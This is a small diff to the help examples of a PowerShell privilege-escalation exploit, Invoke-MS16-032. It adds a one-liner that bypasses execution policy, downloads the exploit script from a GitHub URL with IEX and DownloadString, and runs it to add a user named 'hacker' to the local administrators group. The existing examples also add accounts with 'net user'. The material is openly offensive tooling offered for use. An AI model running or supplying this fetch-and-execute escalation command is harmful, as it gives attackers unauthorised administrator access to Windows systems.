@@ -38,7 +38,7 @@ Specifies Commandline, such as net user xxx xxx /add
 .EXAMPLE
     C:\PS> Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe
     C:\PS> Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline "/c net user 1 1 /add"
-
+    powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net localgroup administrators hacker /add'"
 #>
   [CmdletBinding()]
     param(
